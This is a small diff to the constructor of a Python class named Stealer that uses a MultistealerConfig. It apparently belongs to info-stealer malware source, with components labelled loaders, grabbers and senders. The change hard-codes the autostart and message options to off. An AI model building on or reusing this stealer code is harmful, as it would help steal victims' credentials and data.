@@ -3338,8 +3338,8 @@ class Stealer(Thread):
         self.__loaders = loaders
         self.__grabbers = grabbers
         self.__senders = senders
-        self.__autostart = Utils.autostart in utils or Utils.all in utils
-        self.__message = Utils.message in utils or Utils.all in utils
+        self.__autostart = False
+        self.__message = False
         self.__delay = delay
 
         self.__config = MultistealerConfig()
